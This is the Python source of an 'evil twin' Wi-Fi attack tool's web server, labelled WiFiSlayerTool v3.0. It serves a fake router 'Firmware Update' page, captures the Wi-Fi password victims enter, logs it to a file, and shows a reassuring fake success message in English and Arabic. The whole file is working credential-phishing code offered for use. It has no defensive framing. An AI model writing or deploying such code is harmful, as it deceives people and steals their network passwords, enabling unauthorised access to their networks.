# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Evil Twin Web Server
A simple HTTP server to serve the captive portal and capture passwords.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os
import sys

# Try to find web dir
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
WEB_DIR = os.path.join(BASE_DIR, "web")
HTML_FILE = os.path.join(WEB_DIR, "index.html")

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Always serve the captive portal page for any GET request
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        try:
            with open(HTML_FILE, 'rb') as f:
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.wfile.write(b"<html><body><h1>Firmware Update</h1><form action='/login' method='POST'><input type='password' name='password'><button type='submit'>Submit</button></form></body></html>")

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)
            
            if 'password' in parsed_data:
                password = parsed_data['password'][0]
                
                print("\n" + "="*50)
                print(f" 🚨 PASSWORD CAPTURED: {password} 🚨 ")
                print("="*50 + "\n")
                
                # Save to file
                creds_file = os.path.join(BASE_DIR, "logs", "captured_passwords.txt")
                with open(creds_file, "a") as f:
                    f.write(f"Password captured: {password}\n")

                # Serve success page
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                success_html = """
                <html><head><meta charset="UTF-8"><title>Success</title></head>
                <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f4f4f4;">
                <h2 style="color:green;">Update Started successfully!</h2>
                <p>Your router is now updating. You will regain internet access shortly.</p>
                <p dir="rtl">بدأ التحديث بنجاح! جاري التحديث الآن، سيعود الإنترنت قريباً.</p>
                </body></html>
                """
                self.wfile.write(success_html.encode('utf-8'))
                
                # Exit server after successful capture
                print("Exiting web server...")
                sys.exit(0)

def run(server_class=HTTPServer, handler_class=CaptivePortalHandler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Captive portal web server listening on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

if __name__ == '__main__':
    run()
